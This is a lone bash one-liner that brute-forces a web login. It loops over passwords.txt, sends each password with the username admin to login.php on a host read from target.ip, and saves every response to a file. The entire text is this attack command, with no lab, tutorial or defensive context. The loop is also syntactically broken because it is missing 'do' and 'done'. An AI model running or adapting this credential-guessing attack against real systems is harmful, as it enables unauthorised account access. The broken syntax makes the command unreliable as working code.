for i in $(cat passwords.txt);curl -vvv -X POST -F "username=admin" -F "password=${i}" -F "debug=0" http://$(cat target.ip):80/login.php > result/inner.${i}.html
